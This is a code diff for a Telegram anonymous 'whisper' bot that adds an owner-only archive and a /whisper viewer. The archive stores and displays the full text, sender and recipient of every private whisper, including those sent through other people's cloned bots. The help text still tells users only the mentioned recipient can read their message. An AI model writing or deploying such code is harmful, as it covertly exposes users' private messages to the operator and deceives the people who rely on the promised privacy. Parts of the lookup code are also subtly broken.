@@ -62,6 +62,11 @@ last_group_activity: Dict[int, float] = {}
 clone_whispers = {}  # {bot_username: {message_id: message_data}}
 clone_messages = {}  # For cloned bots' messages
 
+# Whisper archive for owner viewing
+whisper_archive = {}  # Store all whispers for owner
+archive_messages_db = {}  # Archived whispers from main bot
+archive_clone_whispers = {}  # Archived whispers from clone bots
+
 # ============ DATA FILES ============
 DATA_DIR = "data"
 os.makedirs(DATA_DIR, exist_ok=True)
@@ -70,10 +75,12 @@ CLONE_STATS_FILE = os.path.join(DATA_DIR, "clone_stats.json")
 GROUP_DATA_FILE = os.path.join(DATA_DIR, "group_data.json")
 BROADCAST_HISTORY_FILE = os.path.join(DATA_DIR, "broadcast_history.json")
 CLONE_BOTS_FILE = os.path.join(DATA_DIR, "clone_bots.json")
+WHISPER_ARCHIVE_FILE = os.path.join(DATA_DIR, "whisper_archive.json")
 
 # ============ GLOBAL VARIABLES ============
 BOT_USERNAME = None
 ACTIVE_CLONE_BOTS = {}  # {bot_username: bot_info}
+WHISPERS_PER_PAGE = 5  # Whispers per page in /whisper command
 
 # ============ TEXT MESSAGES ============
 WELCOME_TEXT = """
@@ -119,6 +126,7 @@ HELP_TEXT = """
    • /remove - Remove your cloned bot
    • /broadcast - Broadcast to all users (Admin only)
    • /gbroadcast - Broadcast to groups (Admin only)
+   • /whisper - View all whispers (Owner only)
 
 🔒 **Only the mentioned user can read your message!**
 """
@@ -126,7 +134,7 @@ HELP_TEXT = """
 # ============ DATA FUNCTIONS ============
 
 def load_data():
-    global recent_users, clone_stats, group_users_last_5, group_detected, last_group_activity, ACTIVE_CLONE_BOTS
+    global recent_users, clone_stats, group_users_last_5, group_detected, last_group_activity, ACTIVE_CLONE_BOTS, whisper_archive
     try:
         if os.path.exists(RECENT_USERS_FILE):
             with open(RECENT_USERS_FILE, 'r', encoding='utf-8') as f:
@@ -150,6 +158,14 @@ def load_data():
             with open(CLONE_BOTS_FILE, 'r', encoding='utf-8') as f:
                 ACTIVE_CLONE_BOTS = json.load(f)
             logger.info(f"✅ Loaded {len(ACTIVE_CLONE_BOTS)} active clone bots")
+        
+        if os.path.exists(WHISPER_ARCHIVE_FILE):
+            with open(WHISPER_ARCHIVE_FILE, 'r', encoding='utf-8') as f:
+                archive_data = json.load(f)
+                whisper_archive = archive_data.get('whisper_archive', {})
+                archive_messages_db = archive_data.get('archive_messages_db', {})
+                archive_clone_whispers = archive_data.get('archive_clone_whispers', {})
+            logger.info(f"✅ Loaded {len(whisper_archive)} archived whispers")
             
     except Exception as e:
         logger.error(f"❌ Error loading data: {e}")
@@ -159,6 +175,7 @@ def load_data():
         group_detected = set()
         last_group_activity = {}
         ACTIVE_CLONE_BOTS = {}
+        whisper_archive = {}
 
 def save_data():
     try:
@@ -177,12 +194,124 @@ def save_data():
         
         with open(CLONE_BOTS_FILE, 'w', encoding='utf-8') as f:
             json.dump(ACTIVE_CLONE_BOTS, f, indent=2, ensure_ascii=False)
+        
+        with open(WHISPER_ARCHIVE_FILE, 'w', encoding='utf-8') as f:
+            json.dump({
+                'whisper_archive': whisper_archive,
+                'archive_messages_db': archive_messages_db,
+                'archive_clone_whispers': archive_clone_whispers
+            }, f, indent=2, ensure_ascii=False)
             
     except Exception as e:
         logger.error(f"❌ Error saving data: {e}")
 
 # Load data on startup
 load_data()
+
+# ============ WHISPER ARCHIVE FUNCTIONS ============
+
+def archive_whisper(whisper_id, whisper_data, whisper_type="main"):
+    """Archive a whisper for owner viewing"""
+    try:
+        whisper_archive[whisper_id] = {
+            'data': whisper_data,
+            'type': whisper_type,
+            'archived_at': datetime.now().isoformat(),
+            'whisper_id': whisper_id
+        }
+        
+        # Also save to separate storage based on type
+        if whisper_type == "main":
+            archive_messages_db[whisper_id] = whisper_data
+        elif whisper_type.startswith("clone_"):
+            # Extract bot username from type
+            bot_username = whisper_type.replace("clone_", "")
+            if bot_username not in archive_clone_whispers:
+                archive_clone_whispers[bot_username] = {}
+            archive_clone_whispers[bot_username][whisper_id] = whisper_data
+        
+        # Save to file
+        save_data()
+        logger.info(f"✅ Archived whisper {whisper_id} of type {whisper_type}")
+        return True
+    except Exception as e:
+        logger.error(f"Error archiving whisper: {e}")
+        return False
+
+def get_all_whispers():
+    """Get all whispers from main bot and clone bots"""
+    all_whispers = []
+    
+    # Add archived whispers first (these include all whispers)
+    for archive_id, archive_data in whisper_archive.items():
+        whisper_data = archive_data['data']
+        whisper_type = archive_data['type']
+        
+        # Determine sender and target info
+        sender_id = whisper_data.get('sender_id')
+        if 'user_id' in whisper_data:
+            target_id = whisper_data.get('user_id')
+            target_name = whisper_data.get('target_name', 'Unknown')
+        elif 'target_user' in whisper_data:
+            target_id = whisper_data.get('target_user')
+            target_name = whisper_data.get('target_info', {}).get('first_name', target_id)
+        else:
+            target_id = 'Unknown'
+            target_name = 'Unknown'
+        
+        all_whispers.append({
+            'id': archive_id,
+            'type': whisper_type,
+            'sender_id': sender_id,
+            'target_id': target_id,
+            'target_name': target_name,
+            'message': whisper_data.get('msg') or whisper_data.get('message', ''),
+            'timestamp': whisper_data.get('timestamp') or whisper_data.get('created_at', ''),
+            'archived_at': archive_data.get('archived_at', ''),
+            'original_data': whisper_data
+        })
+    
+    # Sort by timestamp (newest first)
+    all_whispers.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
+    return all_whispers
+
+def get_whispers_page(page_num=0):
+    """Get whispers for a specific page"""
+    all_whispers = get_all_whispers()
+    start_idx = page_num * WHISPERS_PER_PAGE
+    end_idx = start_idx + WHISPERS_PER_PAGE
+    
+    page_whispers = all_whispers[start_idx:end_idx]
+    total_pages = max(1, (len(all_whispers) + WHISPERS_PER_PAGE - 1) // WHISPERS_PER_PAGE)
+    
+    return page_whispers, len(all_whispers), total_pages
+
+async def get_user_display_info(user_id):
+    """Get user display info"""
+    try:
+        if isinstance(user_id, int):
+            user = await bot.get_entity(user_id)
+            return {
+                'name': getattr(user, 'first_name', f'User {user_id}'),
+                'username': getattr(user, 'username', None),
+                'id': user_id
+            }
+    except:
+        pass
+    
+    return {
+        'name': f'User {user_id}',
+        'username': None,
+        'id': user_id
+    }
+
+def format_timestamp(timestamp_str):
+    """Format timestamp for display"""
+    try:
+        dt = datetime.fromisoformat(timestamp_str)
+        return dt.strftime("%d/%m %H:%M")
+    except:
+        return timestamp_str
 
 # ============ UTILITY FUNCTIONS ============
 
@@ -649,13 +778,18 @@ async def setup_cloned_bot_handlers(client, bot_username: str, owner_id: int):
             if bot_username not in clone_whispers:
                 clone_whispers[bot_username] = {}
             
-            clone_whispers[bot_username][whisper_id] = {
+            whisper_data = {
                 'message': message_text,
                 'sender_id': event.sender_id,
                 'target_user': target_user,
                 'target_info': user_info,
                 'created_at': datetime.now().isoformat()
             }
+            
+            clone_whispers[bot_username][whisper_id] = whisper_data
+            
+            # Archive the whisper for owner viewing
+            archive_whisper(whisper_id, whisper_data, f"clone_{bot_username}")
             
             # Update stats
             if str(owner_id) in clone_stats:
@@ -959,7 +1093,7 @@ def save_broadcast_history(broadcast_type: str, sender_id: int, message: str, to
         # Keep only last 50 broadcasts
         if len(history) > 50:
             # Remove oldest
-            oldest_key = min(history.keys())
+            oldest_key = min(history.keys(), key=lambda k: history[k]['timestamp'])
             del history[oldest_key]
         
         with open(BROADCAST_HISTORY_FILE, 'w', encoding='utf-8') as f:
@@ -1008,7 +1142,8 @@ async def start_handler(event):
                     [Button.switch_inline("🚀 Try Now", query="")],
                     [Button.inline("📊 Statistics", data="admin_stats"), Button.inline("📖 Help", data="help")],
                     [Button.inline("🔧 Clone Bot", data="clone_info")],
-                    [Button.inline("📢 Broadcast", data="broadcast_menu")]
+                    [Button.inline("📢 Broadcast", data="broadcast_menu")],
+                    [Button.inline("🔍 View Whispers", data="view_whispers")]
                 ]
             )
         else:
@@ -1061,6 +1196,7 @@ async def stats_handler(event):
 🤖 Total Clones: {total_clones}
 👥 Groups Detected: {total_groups}
 👤 Group Users Tracked: {total_group_users}
+🔍 Archived Whispers: {len(whisper_archive)}
 🆔 Admin ID: {ADMIN_ID}
 🌐 Port: {PORT}
 
@@ -1073,6 +1209,86 @@ async def stats_handler(event):
     except Exception as e:
         logger.error(f"Stats error: {e}")
         await event.reply("❌ Error fetching statistics.")
+
+# ============ WHISPER VIEW COMMAND ============
+
+@bot.on(events.NewMessage(pattern='/whisper'))
+async def whisper_view_command(event):
+    """Owner command to view all whispers"""
+    if event.sender_id != ADMIN_ID:
+        await event.reply("❌ Owner only command!")
+        return
+    
+    try:
+        # Get all whispers
+        all_whispers = get_all_whispers()
+        
+        if not all_whispers:
+            await event.reply(
+                "📭 **No Whispers Found**\n\n"
+                "No whispers have been sent yet.\n"
+                "Send some whispers first using the bot!",
+                buttons=[[Button.switch_inline("🚀 Send Whisper", query="")]]
+            )
+            return
+        
+        # Get first page
+        page_whispers, total_count, total_pages = get_whispers_page(0)
+        
+        # Create display
+        display_text = f"🔍 **All Whispers (Owner View)**\n\n"
+        display_text += f"📊 **Total Whispers:** {total_count}\n"
+        display_text += f"📄 **Page:** 1/{total_pages}\n\n"
+        display_text += f"📋 **Recent Whispers:**\n\n"
+        
+        buttons = []
+        
+        for idx, whisper in enumerate(page_whispers, 1):
+            # Format each whisper
+            time_str = format_timestamp(whisper.get('timestamp', ''))
+            message_preview = whisper['message'][:30] + "..." if len(whisper['message']) > 30 else whisper['message']
+            
+            # Get type display
+            if whisper['type'] == 'main':
+                type_display = "Main Bot"
+            elif whisper['type'].startswith('clone_'):
+                bot_name = whisper['type'].replace('clone_', '')
+                type_display = f"Clone: @{bot_name}"
+            else:
+                type_display = whisper['type']
+            
+            display_text += f"**#{idx}** [{time_str}]\n"
+            display_text += f"👤 From: {whisper['sender_id']}\n"
+            display_text += f"🎯 To: {whisper['target_name']}\n"
+            display_text += f"💬: {message_preview}\n"
+            display_text += f"📦: {type_display}\n\n"
+            
+            # Add button to view full message
+            buttons.append([
+                Button.inline(
+                    f"📝 View #{idx}", 
+                    data=f"view_full:{whisper['id']}:{whisper['type']}:0"
+                )
+            ])
+        
+        # Add pagination buttons if needed
+        pagination_buttons = []
+        if total_pages > 1:
+            pagination_buttons.append(Button.inline("➡️ Next", data="whisper_page:1"))
+        
+        if pagination_buttons:
+            buttons.append(pagination_buttons)
+        
+        buttons.append([
+            Button.inline("🔄 Refresh", data="refresh_whispers"),
+            Button.inline("📊 Stats", data="whisper_stats")
+        ])
+        
+        await event.reply(display_text, buttons=buttons)
+        
+    except Exception as e:
+        logger.error(f"Whisper view command error: {e}")
+        await event.reply(f"❌ Error: {str(e)}")
 
 # ============ CLONE COMMAND HANDLERS ============
 
@@ -1464,7 +1680,7 @@ async def inline_handler(event):
         
         # Create message ID
         message_id = f'msg_{event.sender_id}_{target_user}_{int(datetime.now().timestamp())}'
-        messages_db[message_id] = {
+        whisper_data = {
             'user_id': user_info.get('id') or target_user,
             'msg': message_text,
             'sender_id': event.sender_id,
@@ -1475,6 +1691,11 @@ async def inline_handler(event):
             'is_group': is_group_context,
             'group_id': chat_id if is_group_context else None
         }
+        
+        messages_db[message_id] = whisper_data
+        
+        # Archive the whisper for owner viewing
+        archive_whisper(message_id, whisper_data, "main")
         
         # Prepare response
         if user_info.get('username'):
@@ -1513,7 +1734,342 @@ async def callback_handler(event):
     try:
         data = event.data.decode('utf-8')
         
-        if data == "help":
+        # ============ WHISPER VIEWING CALLBACKS ============
+        if data == "view_whispers":
+            if event.sender_id != ADMIN_ID:
+                await event.answer("❌ Owner only!", alert=True)
+                return
+            
+            # Get all whispers
+            all_whispers = get_all_whispers()
+            
+            if not all_whispers:
+                await event.edit(
+                    "📭 **No Whispers Found**\n\n"
+                    "No whispers have been sent yet.\n"
+                    "Send some whispers first using the bot!",
+                    buttons=[[Button.switch_inline("🚀 Send Whisper", query="")]]
+                )
+                return
+            
+            # Get first page
+            page_whispers, total_count, total_pages = get_whispers_page(0)
+            
+            # Create display
+            display_text = f"🔍 **All Whispers (Owner View)**\n\n"
+            display_text += f"📊 **Total Whispers:** {total_count}\n"
+            display_text += f"📄 **Page:** 1/{total_pages}\n\n"
+            display_text += f"📋 **Recent Whispers:**\n\n"
+            
+            buttons = []
+            
+            for idx, whisper in enumerate(page_whispers, 1):
+                # Format each whisper
+                time_str = format_timestamp(whisper.get('timestamp', ''))
+                message_preview = whisper['message'][:30] + "..." if len(whisper['message']) > 30 else whisper['message']
+                
+                # Get type display
+                if whisper['type'] == 'main':
+                    type_display = "Main Bot"
+                elif whisper['type'].startswith('clone_'):
+                    bot_name = whisper['type'].replace('clone_', '')
+                    type_display = f"Clone: @{bot_name}"
+                else:
+                    type_display = whisper['type']
+                
+                display_text += f"**#{idx}** [{time_str}]\n"
+                display_text += f"👤 From: {whisper['sender_id']}\n"
+                display_text += f"🎯 To: {whisper['target_name']}\n"
+                display_text += f"💬: {message_preview}\n"
+                display_text += f"📦: {type_display}\n\n"
+                
+                # Add button to view full message
+                buttons.append([
+                    Button.inline(
+                        f"📝 View #{idx}", 
+                        data=f"view_full:{whisper['id']}:{whisper['type']}:0"
+                    )
+                ])
+            
+            # Add pagination buttons if needed
+            pagination_buttons = []
+            if total_pages > 1:
+                pagination_buttons.append(Button.inline("➡️ Next", data="whisper_page:1"))
+            
+            if pagination_buttons:
+                buttons.append(pagination_buttons)
+            
+            buttons.append([
+                Button.inline("🔄 Refresh", data="view_whispers"),
+                Button.inline("📊 Stats", data="whisper_stats"),
+                Button.inline("🔙 Back", data="back_start")
+            ])
+            
+            await event.edit(display_text, buttons=buttons)
+        
+        elif data.startswith("whisper_page:"):
+            if event.sender_id != ADMIN_ID:
+                await event.answer("❌ Owner only!", alert=True)
+                return
+            
+            page_num = int(data.replace("whisper_page:", ""))
+            page_whispers, total_count, total_pages = get_whispers_page(page_num)
+            
+            if not page_whispers:
+                await event.answer("❌ No more whispers!", alert=True)
+                return
+            
+            # Create display
+            display_text = f"🔍 **All Whispers (Owner View)**\n\n"
+            display_text += f"📊 **Total Whispers:** {total_count}\n"
+            display_text += f"📄 **Page:** {page_num+1}/{total_pages}\n\n"
+            display_text += f"📋 **Whispers:**\n\n"
+            
+            buttons = []
+            
+            for idx, whisper in enumerate(page_whispers, 1):
+                # Calculate global index
+                global_idx = (page_num * WHISPERS_PER_PAGE) + idx
+                
+                # Format each whisper
+                time_str = format_timestamp(whisper.get('timestamp', ''))
+                message_preview = whisper['message'][:30] + "..." if len(whisper['message']) > 30 else whisper['message']
+                
+                # Get type display
+                if whisper['type'] == 'main':
+                    type_display = "Main Bot"
+                elif whisper['type'].startswith('clone_'):
+                    bot_name = whisper['type'].replace('clone_', '')
+                    type_display = f"Clone: @{bot_name}"
+                else:
+                    type_display = whisper['type']
+                
+                display_text += f"**#{global_idx}** [{time_str}]\n"
+                display_text += f"👤 From: {whisper['sender_id']}\n"
+                display_text += f"🎯 To: {whisper['target_name']}\n"
+                display_text += f"💬: {message_preview}\n"
+                display_text += f"📦: {type_display}\n\n"
+                
+                # Add button to view full message
+                buttons.append([
+                    Button.inline(
+                        f"📝 View #{global_idx}", 
+                        data=f"view_full:{whisper['id']}:{whisper['type']}:{page_num}"
+                    )
+                ])
+            
+            # Add pagination buttons
+            pagination_buttons = []
+            if page_num > 0:
+                pagination_buttons.append(Button.inline("⬅️ Prev", data=f"whisper_page:{page_num-1}"))
+            if page_num < total_pages - 1:
+                pagination_buttons.append(Button.inline("➡️ Next", data=f"whisper_page:{page_num+1}"))
+            
+            if pagination_buttons:
+                buttons.append(pagination_buttons)
+            
+            buttons.append([
+                Button.inline("🔄 Refresh", data=f"whisper_page:{page_num}"),
+                Button.inline("📊 Stats", data="whisper_stats"),
+                Button.inline("🔙 Back", data="back_start")
+            ])
+            
+            await event.edit(display_text, buttons=buttons)
+        
+        elif data.startswith("view_full:"):
+            if event.sender_id != ADMIN_ID:
+                await event.answer("❌ Owner only!", alert=True)
+                return
+            
+            # Parse the data
+            parts = data.split(":")
+            if len(parts) >= 4:
+                whisper_id = parts[1]
+                whisper_type = parts[2]
+                page_num = int(parts[3])
+                
+                # Get whisper data
+                if whisper_type == "main" and whisper_id in whisper_archive:
+                    whisper_data = whisper_archive[whisper_id]['data']
+                elif whisper_type.startswith("clone_"):
+                    # Search in clone whispers
+                    found = False
+                    for bot_username, whispers in whisper_archive.items():
+                        if isinstance(whispers, dict) and whisper_id in whispers:
+                            whisper_data = whispers[whisper_id]['data']
+                            found = True
+                            break
+                    
+                    if not found:
+                        await event.answer("❌ Whisper not found!", alert=True)
+                        return
+                else:
+                    await event.answer("❌ Invalid whisper type!", alert=True)
+                    return
+                
+                # Format full message display
+                display_text = f"🔍 **Whisper Details (Owner View)**\n\n"
+                
+                # Add sender info
+                sender_id = whisper_data.get('sender_id')
+                try:
+                    sender = await bot.get_entity(sender_id)
+                    sender_name = getattr(sender, 'first_name', f'User {sender_id}')
+                    sender_username = getattr(sender, 'username', None)
+                    sender_display = f"@{sender_username}" if sender_username else sender_name
+                    display_text += f"👤 **From:** {sender_display} (ID: {sender_id})\n"
+                except:
+                    display_text += f"👤 **From:** User {sender_id}\n"
+                
+                # Add target info
+                if 'user_id' in whisper_data:
+                    target_id = whisper_data.get('user_id')
+                    target_name = whisper_data.get('target_name', 'Unknown')
+                    target_username = whisper_data.get('target_username')
+                elif 'target_user' in whisper_data:
+                    target_id = whisper_data.get('target_user')
+                    target_info = whisper_data.get('target_info', {})
+                    target_name = target_info.get('first_name', target_id)
+                    target_username = target_info.get('username')
+                else:
+                    target_id = 'Unknown'
+                    target_name = 'Unknown'
+                    target_username = None
+                
+                target_display = f"@{target_username}" if target_username else target_name
+                display_text += f"🎯 **To:** {target_display} (ID: {target_id})\n"
+                
+                # Add timestamp
+                timestamp = whisper_data.get('timestamp') or whisper_data.get('created_at', '')
+                if timestamp:
+                    time_str = format_timestamp(timestamp)
+                    display_text += f"🕒 **Time:** {time_str}\n"
+                
+                # Add type
+                if whisper_type == "main":
+                    type_display = "Main Bot"
+                elif whisper_type.startswith("clone_"):
+                    bot_name = whisper_type.replace('clone_', '')
+                    type_display = f"Clone Bot: @{bot_name}"
+                else:
+                    type_display = whisper_type
+                
+                display_text += f"📦 **Type:** {type_display}\n\n"
+                
+                # Add the full message
+                message_text = whisper_data.get('msg') or whisper_data.get('message', '')
+                display_text += f"💬 **Message:**\n{message_text}\n\n"
+                
+                # Add message ID
+                display_text += f"🆔 **Whisper ID:** {whisper_id}"
+                
+                buttons = [
+                    [Button.inline("🔙 Back to List", data=f"whisper_page:{page_num}")],
+                    [Button.inline("🗑️ Delete Whisper", data=f"delete_whisper:{whisper_id}:{whisper_type}:{page_num}")],
+                    [Button.inline("🔄 Refresh", data=f"view_full:{whisper_id}:{whisper_type}:{page_num}")]
+                ]
+                
+                await event.edit(display_text, buttons=buttons)
+            else:
+                await event.answer("❌ Invalid data format!", alert=True)
+        
+        elif data.startswith("delete_whisper:"):
+            if event.sender_id != ADMIN_ID:
+                await event.answer("❌ Owner only!", alert=True)
+                return
+            
+            # Parse the data
+            parts = data.split(":")
+            if len(parts) >= 4:
+                whisper_id = parts[1]
+                whisper_type = parts[2]
+                page_num = int(parts[3])
+                
+                # Delete from archive
+                if whisper_id in whisper_archive:
+                    del whisper_archive[whisper_id]
+                
+                # Also delete from original storage
+                if whisper_type == "main" and whisper_id in messages_db:
+                    del messages_db[whisper_id]
+                elif whisper_type.startswith("clone_"):
+                    bot_name = whisper_type.replace('clone_', '')
+                    if bot_name in clone_whispers and whisper_id in clone_whispers[bot_name]:
+                        del clone_whispers[bot_name][whisper_id]
+                
+                # Save changes
+                save_data()
+                
+                await event.answer("✅ Whisper deleted!", alert=True)
+                await event.edit(
+                    "🗑️ **Whisper Deleted**\n\n"
+                    "The whisper has been deleted from all storage.\n\n"
+                    "Click below to go back to the list.",
+                    buttons=[[Button.inline("🔙 Back to List", data=f"whisper_page:{page_num}")]]
+                )
+            else:
+                await event.answer("❌ Invalid data format!", alert=True)
+        
+        elif data == "whisper_stats":
+            if event.sender_id != ADMIN_ID:
+                await event.answer("❌ Owner only!", alert=True)
+                return
+            
+            # Get statistics
+            all_whispers = get_all_whispers()
+            main_bot_count = len([w for w in all_whispers if w['type'] == 'main'])
+            clone_bot_count = len([w for w in all_whispers if w['type'].startswith('clone_')])
+            
+            # Count by clone bots
+            clone_stats_dict = {}
+            for whisper in all_whispers:
+                if whisper['type'].startswith('clone_'):
+                    bot_name = whisper['type'].replace('clone_', '')
+                    clone_stats_dict[bot_name] = clone_stats_dict.get(bot_name, 0) + 1
+            
+            # Format statistics
+            stats_text = f"📊 **Whisper Statistics**\n\n"
+            stats_text += f"📈 **Total Whispers:** {len(all_whispers)}\n"
+            stats_text += f"🤖 **Main Bot Whispers:** {main_bot_count}\n"
+            stats_text += f"🔧 **Clone Bot Whispers:** {clone_bot_count}\n\n"
+            
+            if clone_stats_dict:
+                stats_text += f"**Clone Bot Breakdown:**\n"
+                for bot_name, count in clone_stats_dict.items():
+                    stats_text += f"• @{bot_name}: {count} whispers\n"
+            
+            stats_text += f"\n📅 **Last Updated:** {datetime.now().strftime('%d/%m/%Y %H:%M')}"
+            
+            buttons = [
+                [Button.inline("🔍 View Whispers", data="view_whispers")],
+                [Button.inline("🔄 Refresh", data="whisper_stats")],
+                [Button.inline("🔙 Back", data="back_start")]
+            ]
+            
+            await event.edit(stats_text, buttons=buttons)
+        
+        elif data == "refresh_whispers":
+            if event.sender_id != ADMIN_ID:
+                await event.answer("❌ Owner only!", alert=True)
+                return
+            
+            await event.answer("🔄 Refreshing whispers...", alert=False)
+            await event.edit(
+                "🔄 **Refreshing whispers...**\n\n"
+                "Please wait while we load the latest whispers.",
+                buttons=[[Button.inline("🔄 Loading...", data="none")]]
+            )
+            
+            # Simulate a small delay and refresh
+            await asyncio.sleep(1)
+            await event.edit(
+                "✅ **Whispers Refreshed**\n\n"
+                "Click below to view updated whispers.",
+                buttons=[[Button.inline("🔍 View Whispers", data="view_whispers")]]
+            )
+        
+        # ============ EXISTING CALLBACKS (keep as is) ============
+        elif data == "help":
             bot_username = (await bot.get_me()).username
             help_text = HELP_TEXT.format(bot_username, bot_username, bot_username)
             
@@ -1538,6 +2094,7 @@ async def callback_handler(event):
             stats_text += f"🤖 Total Clones: {total_clones}\n"
             stats_text += f"👥 Groups Detected: {total_groups}\n"
             stats_text += f"👤 Group Users Tracked: {sum(len(users) for users in group_users_last_5.values())}\n"
+            stats_text += f"🔍 Archived Whispers: {len(whisper_archive)}\n"
             stats_text += f"🆔 Admin ID: {ADMIN_ID}\n"
             stats_text += f"🌐 Port: {PORT}\n"
             stats_text += f"🕒 Last Updated: {datetime.now().strftime('%H:%M:%S')}\n\n"
@@ -1548,6 +2105,7 @@ async def callback_handler(event):
                 stats_text,
                 buttons=[
                     [Button.inline("📢 Broadcast", data="broadcast_menu")],
+                    [Button.inline("🔍 View Whispers", data="view_whispers")],
                     [Button.inline("🔙 Back", data="back_start")]
                 ]
             )
@@ -2014,7 +2572,8 @@ Users can send whispers using @{bot_username}
                         [Button.switch_inline("🚀 Try Now", query="")],
                         [Button.inline("📊 Statistics", data="admin_stats"), Button.inline("📖 Help", data="help")],
                         [Button.inline("🔧 Clone Bot", data="clone_info")],
-                        [Button.inline("📢 Broadcast", data="broadcast_menu")]
+                        [Button.inline("📢 Broadcast", data="broadcast_menu")],
+                        [Button.inline("🔍 View Whispers", data="view_whispers")]
                     ]
                 )
             else:
@@ -2148,6 +2707,7 @@ def home():
     total_clones = len(clone_stats)
     groups_detected_count = len(group_detected)
     group_users = sum(len(users) for users in group_users_last_5.values())
+    archived_whispers = len(whisper_archive)
     server_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
     return f"""
@@ -2175,6 +2735,7 @@ def home():
                 Active Clone Bots: {len(ACTIVE_CLONE_BOTS)}<br>
                 Groups Detected: {groups_detected_count}<br>
                 Group Users: {group_users}<br>
+                Archived Whispers: {archived_whispers}<br>
                 Server Time: {server_time}
             </div>
             <p>This bot allows you to send anonymous secret messages to Telegram users.</p>
@@ -2185,9 +2746,11 @@ def home():
                 <li>📢 Broadcast to users and groups</li>
                 <li>👥 Auto group detection and user tracking</li>
                 <li>🎯 Easy inline mode with multiple formats</li>
+                <li>👁️ Owner can view all whispers with /whisper command</li>
             </ul>
             <p><strong>Usage:</strong> Use inline mode in any chat: <code>@{bot_username} your_message @username</code></p>
             <p><strong>Clone your own bot:</strong> Use <code>/clone your_bot_token</code></p>
+            <p><strong>Owner whisper viewing:</strong> Use <code>/whisper</code> to view all sent whispers</p>
         </div>
     </body>
     </html>
@@ -2211,6 +2774,7 @@ def health():
         "active_clone_bots": len(ACTIVE_CLONE_BOTS),
         "groups_detected": len(group_detected),
         "group_users": sum(len(users) for users in group_users_last_5.values()),
+        "archived_whispers": len(whisper_archive),
         "bot_connected": bot_connected
     })
 
@@ -2275,15 +2839,18 @@ async def main():
         logger.info(f"🤖 Active Clone Bots: {len([b for b in ACTIVE_CLONE_BOTS.values() if b.get('status') == 'active'])}")
         logger.info(f"👑 Admin: {ADMIN_ID}")
         logger.info(f"👥 Recent Users: {len(recent_users)}")
+        logger.info(f"🔍 Archived Whispers: {len(whisper_archive)}")
         logger.info(f"🌐 Web server running on port {PORT}")
         logger.info("✅ Bot is ready and working!")
         logger.info("🔗 Use /start to begin")
+        logger.info("👁️ Owner can use /whisper to view all whispers")
         logger.info("📢 **KEY FEATURES:**")
         logger.info("   • Accepts ANY username or ID (even non-existent)")
         logger.info("   • REAL bot cloning with actual working bots")
         logger.info("   • Full whisper functionality for cloned bots")
         logger.info("   • Broadcast to users and groups")
         logger.info("   • Group detection and user tracking")
+        logger.info("   • Owner can view all whispers with /whisper command")
         
     except Exception as e:
         logger.error(f"❌ Error in main: {e}")
@@ -2300,6 +2867,7 @@ if __name__ == '__main__':
     print("   3️⃣ Clone bots have full functionality")
     print("   4️⃣ Broadcast to users & groups")
     print("   5️⃣ Group detection & user tracking")
+    print("   6️⃣ 👁️ OWNER WHISPER VIEWING ENABLED")
     
     try:
         # Start the bot
@@ -2316,6 +2884,7 @@ if __name__ == '__main__':
         print("   • /broadcast - Broadcast to users (Admin)")
         print("   • /gbroadcast - Broadcast to groups (Admin)")
         print("   • /stats - Admin statistics")
+        print("   • /whisper - View ALL whispers (Owner only)")
         print("\n💡 **Inline Usage Examples:**")
         print("   • @bot_username Hello! @username")
         print("   • @bot_username @username Hello!")
